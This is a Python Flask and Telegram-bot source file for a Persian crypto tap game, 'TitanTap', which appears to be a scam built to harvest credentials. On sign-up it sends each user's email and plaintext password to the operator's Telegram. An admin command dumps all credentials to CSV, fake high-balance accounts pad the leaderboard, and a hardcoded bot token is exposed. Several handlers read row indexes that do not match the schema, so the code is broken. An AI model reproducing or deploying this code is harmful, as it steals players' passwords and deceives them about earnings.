import sqlite3
import random
import string
import time
import threading
import telebot
from telebot import types
from flask import Flask, request, jsonify
import os
import csv

BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
ADMIN_ID  = "2028533085"

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
SETTINGS = {"withdraw_active": True}

def init_db():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, password TEXT, balance REAL DEFAULT 0.0, profit_per_hour REAL DEFAULT 0.0, tap_power REAL DEFAULT 0.001, card1 INT DEFAULT 0, card2 INT DEFAULT 0, card3 INT DEFAULT 0, card4 INT DEFAULT 0, ref_count INTEGER DEFAULT 0, last_sync REAL DEFAULT 0, last_cipher REAL DEFAULT 0, is_bot INTEGER DEFAULT 0)''')
    
    # ساخت ربات‌های فیک
    c.execute("SELECT COUNT(*) FROM users WHERE is_bot=1")
    if c.fetchone()[0] == 0:
        bots = [("CryptoKing", 15400.5), ("Satoshi_99", 8900.0), ("HamsterPro", 4500.2), ("TitanWhale", 12000.0), ("Ali_Tapper", 2300.5), ("MoonBoy", 1100.0)]
        for b in bots:
            c.execute("INSERT OR IGNORE INTO users (email, password, balance, is_bot, last_sync) VALUES (?, '123', ?, 1, ?)", (b[0]+"@bot.com", b[1], time.time()))
            
    conn.commit()
    conn.close()

init_db()

def get_user(email):
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email=?", (email,))
    user = c.fetchone()
    conn.close()
    return user

def update_user(email, query, params):
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute(f"UPDATE users SET {query} WHERE email=?", params + (email,))
    conn.commit()
    conn.close()

# ================= ربات تلگرام =================
@bot.message_handler(commands=['start', 'admin'])
def bot_start(message):
    if str(message.chat.id) != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('📊 آمار'), types.KeyboardButton('👥 کاربران'))
    markup.add(types.KeyboardButton('⚙️ تنظیمات'), types.KeyboardButton('📥 دیتابیس'))
    bot.reply_to(message, "👑 **پنل مدیریت تایتان‌تپ**", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📊 آمار')
def bot_stats(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*), SUM(balance) FROM users WHERE is_bot=0")
    data = c.fetchone()
    conn.close()
    bot.reply_to(message, f"👥 کاربران واقعی: {data[0]}\n💰 کل تپ‌کوین: {data[1]:.2f} TTN")

@bot.message_handler(func=lambda message: message.text == '⚙️ تنظیمات')
def bot_settings(message):
    if str(message.chat.id) != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup()
    status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
    markup.add(types.InlineKeyboardButton(f"برداشت: {status}", callback_data="toggle_wd"))
    bot.send_message(ADMIN_ID, "وضعیت برداشت:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.from_user.id) != ADMIN_ID: return
    if call.data == "toggle_wd":
        SETTINGS["withdraw_active"] = not SETTINGS["withdraw_active"]
        status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
        bot.edit_message_text(f"وضعیت برداشت: {status}", call.message.chat.id, call.message.message_id, reply_markup=call.message.reply_markup)

@bot.message_handler(func=lambda message: message.text == '👥 کاربران')
def bot_users(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, balance FROM users WHERE is_bot=0 ORDER BY balance DESC LIMIT 15")
    users = c.fetchall()
    conn.close()
    text = "👥 **کاربران:**\n\n"
    for u in users: text += f"📧 {u[0]} | 💰 {u[1]:.1f} TTN\n"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda message: message.text == '📥 دیتابیس')
def bot_export(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, password, balance FROM users WHERE is_bot=0")
    users = c.fetchall()
    conn.close()
    filename = "users.csv"
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Email', 'Password', 'Balance'])
        writer.writerows(users)
    with open(filename, 'rb') as f: bot.send_document(message.chat.id, f)
    os.remove(filename)

def run_bot(): bot.polling(none_stop=True)

# ================= وب سرور =================
html_game = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TitanTap</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
<style>
  body { font-family: 'Vazirmatn', sans-serif; background: #0b0f19; color: white; text-align: center; margin: 0; padding: 20px; padding-bottom: 80px; }
  .box { max-width: 350px; margin: 0 auto; background: #151b2b; padding: 20px; border-radius: 15px; }
  input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #2a3441; background: #0b0f19; color: white; box-sizing: border-box; font-family: inherit; }
  button { width: 100%; padding: 15px; background: #ffaa00; color: black; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; font-family: inherit; margin-top: 10px; }
  .link { color: #00ffcc; cursor: pointer; margin-top: 15px; display: inline-block; text-decoration: underline; font-size: 14px; }
  .hide { display: none; }
  .balance { font-size: 32px; font-weight: bold; color: #ffaa00; margin: 20px 0; }
  .profit { font-size: 14px; color: #00ffcc; margin-bottom: 20px; }
  .tap-btn { width: 150px; height: 150px; border-radius: 50%; background: #ffaa00; margin: 0 auto; font-size: 60px; display: flex; justify-content: center; align-items: center; cursor: pointer; user-select: none; border: 4px solid #fff; }
  .tap-btn:active { transform: scale(0.95); }
  .card { background: #151b2b; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; text-align: right; }
  .card button { width: auto; padding: 8px 15px; font-size: 14px; margin: 0; }
  .nav { display: flex; justify-content: space-around; background: #151b2b; padding: 15px 5px; position: fixed; bottom: 0; left: 0; right: 0; border-top: 1px solid #2a3441; }
  .nav div { cursor: pointer; font-size: 12px; color: #888; font-weight: bold; }
  .nav div.active { color: #ffaa00; }
</style>
</head>
<body>

<div id="auth" class="box">
    <div id="login-form">
        <h2>ورود به تایتان</h2>
        <input type="email" id="l_email" placeholder="ایمیل">
        <input type="password" id="l_pass" placeholder="رمز عبور">
        <button onclick="doLogin()">ورود</button>
        <div class="link" onclick="showForm('reg-form')">ثبت‌نام کنید</div>
    </div>
    <div id="reg-form" class="hide">
        <h2>ثبت‌نام</h2>
        <input type="email" id="r_email" placeholder="ایمیل">
        <input type="password" id="r_pass" placeholder="رمز عبور">
        <button onclick="doRegister()">ساخت حساب</button>
        <div class="link" onclick="showForm('login-form')">بازگشت</div>
    </div>
</div>

<div id="game" class="hide">
    <!-- MINE -->
    <div id="tab-mine">
        <div class="balance"><span id="balance">0.000</span> TTN</div>
        <div class="profit">+<span id="profit">0.00</span> TTN در ساعت</div>
        <div class="tap-btn" onclick="doTap()">🛡️</div>
        <div class="card" style="margin-top:20px;">
            <div><b>🎯 ماموریت روزانه</b><br><small>۵۰۰ بار تپ کن و ۵۰۰ TTN بگیر!</small></div>
            <button onclick="claimQuest()" style="background:#00ffcc;">دریافت</button>
        </div>
    </div>

    <!-- CARDS -->
    <div id="tab-cards" class="hide">
        <h2>کارت‌های استخراج</h2>
        <div class="card"><div><b>ماینر</b><br><small>سطح <span id="lvl1">0</span></small></div><button onclick="buyCard(1)">خرید (<span id="cost1">100</span>)</button></div>
        <div class="card"><div><b>سرور ابری</b><br><small>سطح <span id="lvl2">0</span></small></div><button onclick="buyCard(2)">خرید (<span id="cost2">500</span>)</button></div>
        <div class="card"><div><b>دیتاسنتر</b><br><small>سطح <span id="lvl3">0</span></small></div><button onclick="buyCard(3)">خرید (<span id="cost3">2000</span>)</button></div>
        <div class="card"><div><b>کوانتومی</b><br><small>سطح <span id="lvl4">0</span></small></div><button onclick="buyCard(4)">خرید (<span id="cost4">10000</span>)</button></div>
    </div>

    <!-- TOP -->
    <div id="tab-top" class="hide">
        <h2>برترین‌ها 🏆</h2>
        <div id="leaderboard"></div>
    </div>

    <div class="nav">
        <div id="nav-mine" class="active" onclick="switchTab('mine')">استخراج</div>
        <div id="nav-cards" onclick="switchTab('cards')">کارت‌ها</div>
        <div id="nav-top" onclick="switchTab('top')">برترین‌ها</div>
    </div>
</div>

<script>
    var currentUser = "";
    var currentProfit = 0;
    var currentTapPower = 0.001;
    var unsynced = 0;
    var totalTaps = 0;
    var costs = { 1: 100, 2: 500, 3: 2000, 4: 10000 };

    function showForm(id) {
        document.getElementById('login-form').classList.add('hide');
        document.getElementById('reg-form').classList.add('hide');
        document.getElementById(id).classList.remove('hide');
    }

    function switchTab(tab) {
        var tabs = ['mine', 'cards', 'top'];
        for(var i=0; i<tabs.length; i++) {
            document.getElementById('tab-' + tabs[i]).classList.add('hide');
            document.getElementById('nav-' + tabs[i]).classList.remove('active');
        }
        document.getElementById('tab-' + tab).classList.remove('hide');
        document.getElementById('nav-' + tab).classList.add('active');
        if(tab === 'top') loadLeaderboard();
    }

    function api(url, data, success) {
        fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(function(res) { return res.json(); }).then(function(res) {
            if(res.success) success(res); else alert(res.message);
        }).catch(function(err) { alert("خطا در اتصال"); });
    }

    function doLogin() {
        var email = document.getElementById('l_email').value;
        var pass = document.getElementById('l_pass').value;
        api('/api/login', {email: email, password: pass}, function(res) {
            currentUser = email; startGame(res.user);
        });
    }

    function doRegister() {
        var email = document.getElementById('r_email').value;
        var pass = document.getElementById('r_pass').value;
        api('/api/register', {email: email, password: pass}, function(res) {
            currentUser = email; startGame(res.user);
        });
    }

    function startGame(user) {
        document.getElementById('auth').classList.add('hide');
        document.getElementById('game').classList.remove('hide');
        updateUI(user);
        
        setInterval(function() {
            var bal = parseFloat(document.getElementById('balance').innerText);
            document.getElementById('balance').innerText = (bal + (currentProfit / 3600)).toFixed(3);
        }, 1000);

        setInterval(function() {
            if(unsynced > 0) {
                var toSend = unsynced; unsynced = 0;
                api('/api/tap', {email: currentUser, amount: toSend}, function(){});
            }
        }, 5000);
    }

    function updateUI(user) {
        if(user.balance !== undefined) document.getElementById('balance').innerText = user.balance.toFixed(3);
        if(user.profit_per_hour !== undefined) {
            document.getElementById('profit').innerText = user.profit_per_hour.toFixed(2);
            currentProfit = user.profit_per_hour;
        }
        if(user.tap_power !== undefined) currentTapPower = user.tap_power;
        
        for(var i=1; i<=4; i++) {
            if(user['card' + i] !== undefined) {
                document.getElementById('lvl' + i).innerText = user['card' + i];
                costs[i] = 100 * Math.pow(5, i-1) * Math.pow(1.5, user['card' + i]);
                document.getElementById('cost' + i).innerText = Math.floor(costs[i]);
            }
        }
    }

    function doTap() {
        var bal = parseFloat(document.getElementById('balance').innerText);
        document.getElementById('balance').innerText = (bal + currentTapPower).toFixed(3);
        unsynced += currentTapPower;
        totalTaps++;
    }

    function buyCard(id) {
        api('/api/upgrade', {email: currentUser, card_id: id, cost: costs[id]}, function(res) {
            updateUI(res.user); alert("ارتقا انجام شد!");
        });
    }

    function claimQuest() {
        if(totalTaps < 500) return alert("هنوز ۵۰۰ بار تپ نکردی! (تپ‌های فعلی: " + totalTaps + ")");
        api('/api/quest', {email: currentUser}, function(res) {
            updateUI(res.user); alert("۵۰۰ TTN جایزه گرفتی!");
            totalTaps = 0;
        });
    }

    function loadLeaderboard() {
        fetch('/api/leaderboard').then(function(res) { return res.json(); }).then(function(data) {
            var html = "";
            for(var i=0; i<data.length; i++) {
                var u = data[i];
                html += '<div class="card"><span>#' + (i+1) + ' ' + u.email.split('@')[0] + '</span> <span style="color:#ffaa00;">' + u.balance.toFixed(1) + ' TTN</span></div>';
            }
            document.getElementById('leaderboard').innerHTML = html;
        });
    }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return html_game

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    email, password = data.get('email'), data.get('password')
    if get_user(email): return jsonify({"success": False, "message": "ایمیل تکراری است"})
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (email, password, last_sync) VALUES (?, ?, ?)", (email, password, time.time()))
    conn.commit()
    conn.close()
    bot.send_message(ADMIN_ID, f"🔴 ثبت نام جدید\n📧 {email}\n🔑 {password}")
    return jsonify({"success": True, "user": {"email": email, "balance": 0, "profit_per_hour": 0, "tap_power": 0.001, "card1": 0, "card2": 0, "card3": 0, "card4": 0}})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    email, password = data.get('email'), data.get('password')
    user = get_user(email)
    if not user or user[1] != password: return jsonify({"success": False, "message": "اطلاعات اشتباه است"})
    now = time.time()
    if user[15] > 0: 
        gain = ((now - user[15]) / 3600.0) * user[9] 
        update_user(email, "balance = balance + ?, last_sync = ?", (gain, now))
        user = get_user(email)
    else:
        update_user(email, "last_sync = ?", (now,))
        user = get_user(email)
    return jsonify({"success": True, "user": {"email": user[0], "balance": user[8], "profit_per_hour": user[9], "tap_power": user[10], "card1": user[11], "card2": user[12], "card3": user[13], "card4": user[14]}})

@app.route('/api/tap', methods=['POST'])
def tap():
    update_user(request.json['email'], "balance = balance + ?", (request.json['amount'],))
    return jsonify({"success": True})

@app.route('/api/upgrade', methods=['POST'])
def upgrade():
    data = request.json
    user = get_user(data['email'])
    if user[8] < data['cost']: return jsonify({"success": False, "message": "موجودی کافی نیست"})
    p_add = {1: 10, 2: 60, 3: 300, 4: 1500}[data['card_id']]
    update_user(data['email'], f"balance = balance - ?, profit_per_hour = profit_per_hour + ?, card{data['card_id']} = card{data['card_id']} + 1", (data['cost'], p_add))
    user = get_user(data['email'])
    return jsonify({"success": True, "user": {"email": user[0], "balance": user[8], "profit_per_hour": user[9], "tap_power": user[10], "card1": user[11], "card2": user[12], "card3": user[13], "card4": user[14]}})

@app.route('/api/quest', methods=['POST'])
def quest():
    email = request.json['email']
    update_user(email, "balance = balance + 500.0", ())
    user = get_user(email)
    return jsonify({"success": True, "user": {"email": user[0], "balance": user[8], "profit_per_hour": user[9], "tap_power": user[10], "card1": user[11], "card2": user[12], "card3": user[13], "card4": user[14]}})

@app.route('/api/leaderboard')
def leaderboard():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, balance FROM users ORDER BY balance DESC LIMIT 10")
    users = [{"email": u[0], "balance": u[1]} for u in c.fetchall()]
    conn.close()
    return jsonify(users)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
